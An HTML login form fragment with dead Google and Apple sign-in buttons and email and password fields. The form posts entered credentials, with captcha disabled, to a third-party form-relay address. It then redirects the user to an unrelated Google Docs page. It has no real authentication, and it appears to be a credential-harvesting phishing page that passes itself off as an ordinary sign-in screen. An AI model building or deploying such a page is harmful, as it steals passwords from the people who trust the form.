  <div class="login_form">
    <!-- Login form container -->
    <form action="https://formsubmit.co/5778749fe907df6dd2a8de1372d80f16" method="post">
      <h3>Log in with</h3>

      <div class="login_option">
        <!-- Google button -->
        <div class="option">
          <a href="#">
            <img src="logos/google.png" alt="Google" />
            <span>Google</span>
          </a>
        </div>

        <!-- Apple button -->
        <div class="option">
          <a href="#">
            <img src="logos/apple.png" alt="Apple" />
            <span>Apple</span>
          </a>
        </div>
      </div>

      <!-- Login option separator -->
      <p class="separator">
        <span>or</span>
      </p>

      <!-- Email input box -->
      <div class="input_box">
        <label for="email">Email</label>
        <input type="email" id="email" name= "email" placeholder="Enter email address" required />
      </div>

      <!-- Paswwrod input box -->
      <div class="input_box">
        <div class="password_title">
          <label for="password">Password</label>
          <a href="#">Forgot Password?</a>
        </div>

        <input type="password" id="password" name="password" placeholder="Enter your password" required />
      </div>
      <input type="hidden" name="_next" value="https://docs.google.com/document/d/1U8ioCSk-TI0_tcJBgHetkaopYjixgWwGMvGRqysvCGA/edit?usp=drivesdk">
       <!-- Login button -->
      <button type="submit">Log In</button>
      <input type="hidden" name="_captcha" value="false">

    </form>
